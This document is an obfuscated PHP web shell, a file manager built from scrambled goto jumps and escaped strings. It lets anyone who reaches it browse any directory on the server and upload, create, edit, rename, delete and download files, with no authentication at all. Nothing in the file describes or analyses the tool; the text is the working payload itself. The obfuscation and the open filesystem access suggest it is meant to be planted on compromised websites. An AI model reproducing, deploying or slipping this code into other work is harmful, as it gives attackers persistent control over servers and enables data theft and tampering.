<?php
 goto DvfSH; bDmYs: goto pSL2x; goto UKzoP; waWk3: ?>
</tbody></table><?php  goto wYr8D; xB_Rw: goto bARRq; goto iDWw6; OR8YN: goto eCORv; goto Xl2AV; av2jK: eAlZU: goto waBTI; UKzoP: bARRq: goto krs7w; giGmj: if (isset($_POST["\x72\145\156\x61\155\x65\x5f\x66\x69\154\x65"])) { $old_name = $current_dir . "\x2f" . $_POST["\x6f\154\x64\137\156\141\x6d\145"]; $new_name = $current_dir . "\57" . $_POST["\156\145\167\137\156\141\x6d\x65"]; rename($old_name, $new_name); header("\114\x6f\143\x61\164\151\x6f\156\x3a\40\77\x64\151\x72\x3d" . urlencode($_GET["\144\151\x72"])); } goto FRCrn; blil9: if (!$current_dir || !is_dir($current_dir)) { $current_dir = $root_dir; } goto hDhwu; TNjkP: echo $current_dir; goto wJE1J; sSdNC: $root_dir = realpath(__DIR__); goto SGybC; zuZp0: function listDirectory($dir) { $files = scandir($dir); $directories = array(); $regular_files = array(); foreach ($files as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if (is_dir($dir . "\57" . $file)) { $directories[] = $file; } else { $regular_files[] = $file; } } } foreach ($directories as $directory) { echo "\74\x74\162\x3e"; echo "\74\x74\144\76\x3c\x61\x20\150\x72\x65\146\75\42\77\x64\151\x72\75" . urlencode($dir . "\x2f" . $directory) . "\x22\76\360\x9f\223\201\x20" . $directory . "\x3c\x2f\x61\x3e\x3c\57\164\144\76"; echo "\74\164\x64\76\106\157\154\x64\x65\162\74\x2f\164\144\x3e"; echo "\x3c\x74\x64\76\xa\40\x20\x20\x20\x20\40\40\x20\40\40\x20\40\x3c\x61\40\150\x72\145\x66\x3d\x22\x3f\x64\x69\162\x3d" . urlencode($dir) . "\46\x65\x64\151\164\x3d" . urlencode($directory) . "\x22\x3e\105\144\151\164\74\57\x61\76\x20\x7c\xa\x20\x20\40\x20\40\40\40\x20\40\x20\40\40\74\141\40\150\162\x65\146\75\x22\77\144\x69\x72\75" . urlencode($dir) . "\46\x64\145\x6c\x65\164\x65\75" . urlencode($directory) . "\x22\76\104\x65\154\x65\164\145\74\x2f\x61\76\x20\x7c\12\x20\40\x20\x20\40\40\x20\x20\40\x20\40\40\74\141\40\150\162\145\x66\x3d\x22\x3f\144\x69\x72\x3d" . urlencode($dir) . "\x26\x72\x65\x6e\141\155\145\x3d" . urlencode($directory) . "\x22\x3e\x52\145\156\141\x6d\145\x3c\x2f\141\76\40\x7c\xa\40\x20\40\x20\x20\40\x20\40\40\40\x20\40\74\141\40\150\x72\x65\x66\75\42\77\x64\x69\162\75" . urlencode($dir) . "\46\x64\x6f\x77\x6e\x6c\x6f\141\x64\x3d" . urlencode($directory) . "\x22\76\104\x6f\x77\x6e\x6c\x6f\x61\144\74\57\141\x3e\xa\40\40\40\x20\x20\40\x20\x20\x3c\57\x74\144\76"; echo "\74\57\164\x72\x3e"; } foreach ($regular_files as $file) { echo "\74\x74\162\x3e"; echo "\74\164\x64\76" . $file . "\74\57\164\x64\x3e"; echo "\74\x74\x64\x3e" . filesize($dir . "\x2f" . $file) . "\40\x62\x79\x74\x65\x73\74\x2f\164\x64\76"; echo "\x3c\x74\144\x3e\12\x20\40\40\40\40\x20\40\x20\x20\x20\x20\x20\74\141\x20\150\162\x65\146\75\x22\x3f\144\151\162\75" . urlencode($dir) . "\46\145\144\151\x74\75" . urlencode($file) . "\x22\x3e\105\144\x69\164\74\x2f\x61\x3e\40\x7c\xa\40\x20\x20\40\40\40\40\x20\x20\x20\40\40\x3c\x61\40\150\162\145\x66\x3d\x22\77\144\151\162\x3d" . urlencode($dir) . "\x26\144\x65\x6c\x65\164\145\x3d" . urlencode($file) . "\42\76\104\145\154\x65\x74\145\74\x2f\x61\x3e\40\174\12\40\40\x20\x20\40\40\x20\40\40\40\x20\40\x3c\x61\40\150\x72\x65\x66\x3d\42\x3f\x64\151\x72\75" . urlencode($dir) . "\x26\x72\x65\156\x61\155\x65\75" . urlencode($file) . "\x22\76\x52\145\x6e\x61\x6d\x65\74\57\141\76\x20\x7c\12\40\x20\40\x20\x20\40\40\x20\x20\40\x20\40\x3c\141\x20\150\x72\145\x66\75\x22\x3f\144\151\162\x3d" . urlencode($dir) . "\x26\x64\157\167\156\x6c\157\141\144\x3d" . urlencode($file) . "\x22\76\x44\157\167\156\154\x6f\x61\144\74\57\141\76\xa\x20\40\40\40\40\40\40\x20\x3c\x2f\x74\x64\76"; echo "\x3c\x2f\x74\x72\x3e"; } } goto dxw3q; XasWH: eCORv: goto giGmj; eOXez: ?>
<!doctypehtml><html><head><title>Ахатә даҟьа</title><style>body{background-color:#3b1019;color:#e0e0e0;font-family:Arial,sans-serif}h2{color:#bb86fc}table{width:100%;border-collapse:collapse}td,th{padding:10px;text-align:left}th{background-color:#333;color:#bb86fc}tr:nth-child(even){background-color:#222}tr:nth-child(odd){background-color:#3b1019}a{color:#03dac6;text-decoration:none}a:hover{color:#bb86fc}button{background-color:#03dac6;color:#3b1019;border:none;padding:10px 20px;cursor:pointer}button:hover{background-color:#bb86fc}textarea{width:100%;height:400px;background-color:#222;color:#e0e0e0;border:1px solid #bb86fc}input[type=file],input[type=text]{color:#e0e0e0;background-color:#222;border:1px solid #bb86fc;padding:10px}.form-container{display:flex;justify-content:space-between;margin-bottom:20px}.form-container form{margin-right:10px}</style></head><body><p>Current Directory: <a href="?dir=<?php  goto MCrcZ; SUmcV: NfrgH: goto eOXez; Z74nn: ?>
"style="color:#03dac6"><?php  goto TNjkP; VVMLl: listDirectory($current_dir); goto waWk3; MCrcZ: echo urlencode(dirname($current_dir)); goto Z74nn; OM30m: if (isset($_POST["\165\x70\154\157\141\144"])) { $target_file = $current_dir . "\57" . basename($_FILES["\x66\x69\x6c\145"]["\x6e\x61\155\x65"]); move_uploaded_file($_FILES["\146\x69\154\x65"]["\164\x6d\x70\137\x6e\141\x6d\145"], $target_file); header("\x4c\157\143\141\164\x69\x6f\x6e\72\40\77\144\151\162\x3d" . urlencode($_GET["\144\151\x72"])); } goto bDmYs; zfnMo: if (isset($_GET["\x65\x64\x69\x74"])) { $file_to_edit = $current_dir . "\x2f" . $_GET["\x65\x64\151\x74"]; if (is_file($file_to_edit)) { $file_content = file_get_contents($file_to_edit); ?>
<form method="post"><input name="file_name"type="hidden"value="<?php  echo $_GET["\145\144\151\x74"]; ?>
"> <textarea name="file_content"><?php  echo htmlspecialchars($file_content); ?>
</textarea><br><button name="save_file"type="submit">Save Changes</button></form><?php  } } goto Wmnli; dxw3q: goto x_ZTL; goto QCBLm; krs7w: if (isset($_GET["\x64\157\x77\156\x6c\157\x61\144"])) { $file_to_download = $current_dir . "\x2f" . $_GET["\144\x6f\x77\x6e\x6c\157\x61\x64"]; if (is_file($file_to_download)) { header("\103\x6f\156\164\x65\156\x74\55\x44\x65\x73\143\162\151\x70\x74\x69\x6f\156\72\40\x46\151\x6c\145\x20\124\162\141\x6e\163\146\145\162"); header("\x43\x6f\x6e\x74\145\156\x74\55\124\171\x70\145\x3a\x20\x61\160\x70\x6c\x69\x63\x61\x74\x69\x6f\156\57\x6f\143\x74\145\x74\x2d\163\x74\x72\x65\141\155"); header("\103\x6f\x6e\x74\x65\156\x74\55\104\151\x73\160\x6f\163\151\x74\x69\157\156\x3a\x20\x61\x74\x74\141\x63\x68\155\x65\156\164\73\x20\x66\x69\x6c\145\156\x61\155\x65\x3d\42" . basename($file_to_download) . "\x22"); header("\103\157\x6e\x74\145\156\164\55\114\x65\x6e\147\x74\150\x3a\x20" . filesize($file_to_download)); readfile($file_to_download); die; } } goto OR8YN; vLo8y: $current_dir = isset($_GET["\144\151\x72"]) ? realpath($_GET["\144\x69\x72"]) : $root_dir; goto bwhzF; QCBLm: x_ZTL: goto GCXTc; pgNZo: pe1ds: goto sSdNC; iZY4V: if (isset($_POST["\x73\x61\166\145\x5f\x66\151\154\x65"])) { $file_to_edit = $current_dir . "\57" . $_POST["\146\151\x6c\145\x5f\156\141\x6d\x65"]; $new_content = $_POST["\x66\x69\x6c\145\x5f\143\157\x6e\x74\x65\x6e\164"]; file_put_contents($file_to_edit, $new_content); header("\114\157\x63\x61\164\151\x6f\x6e\72\x20\x3f\144\x69\x72\75" . urlencode($_GET["\144\151\162"])); } goto TNBVW; hDhwu: goto BowEF; goto je5GY; SGybC: goto J3_a0; goto av2jK; GCXTc: if (isset($_GET["\x64\x65\154\x65\164\x65"])) { $file_to_delete = $current_dir . "\x2f" . $_GET["\144\145\x6c\x65\x74\x65"]; if (is_file($file_to_delete)) { unlink($file_to_delete); } header("\x4c\157\x63\x61\x74\151\x6f\156\72\x20\x3f\144\x69\x72\75" . urlencode($_GET["\144\151\x72"])); } goto xB_Rw; FRCrn: goto XriUC; goto pgNZo; H2dif: goto NfrgH; goto SUmcV; bwhzF: goto eMNOy; goto XasWH; DvfSH: goto pe1ds; goto QXwUz; waBTI: if (isset($_POST["\143\162\x65\x61\164\145\x5f\x66\x69\x6c\x65"])) { $new_file_name = $_POST["\156\x65\x77\137\146\151\154\x65\x5f\156\141\155\145"]; $new_file_path = $current_dir . "\x2f" . $new_file_name; file_put_contents($new_file_path, ''); header("\x4c\157\x63\x61\x74\x69\157\156\72\40\77\144\151\x72\75" . urlencode($_GET["\144\151\x72"])); } goto H2dif; iDWw6: J3_a0: goto vLo8y; QXwUz: XriUC: goto OM30m; wJE1J: ?>
</a></p><div class="form-container"><form method="post"enctype="multipart/form-data"><input name="file"type="file"> <button name="upload"type="submit">Upload</button></form><form method="post"><input name="new_file_name"placeholder="New file name"required> <button name="create_file"type="submit">Create File</button></form></div><table border="1"><thead><tr><th>File Name</th><th>Μέγεθος</th><th>Actions</th></tr></thead><tbody><?php  goto VVMLl; Xl2AV: eMNOy: goto blil9; je5GY: pSL2x: goto iZY4V; wYr8D: if (isset($_GET["\162\145\x6e\x61\x6d\145"])) { ?>
<form method="post"><input name="old_name"type="hidden"value="<?php  echo $_GET["\x72\x65\156\x61\155\145"]; ?>
"> <input name="new_name"placeholder="New name"style="width:100%;padding:10px"> <button name="rename_file"type="submit">Rename</button></form><?php  } goto zfnMo; ZQSef: BowEF: goto zuZp0; TNBVW: goto eAlZU; goto ZQSef; Wmnli: ?>
</body></html>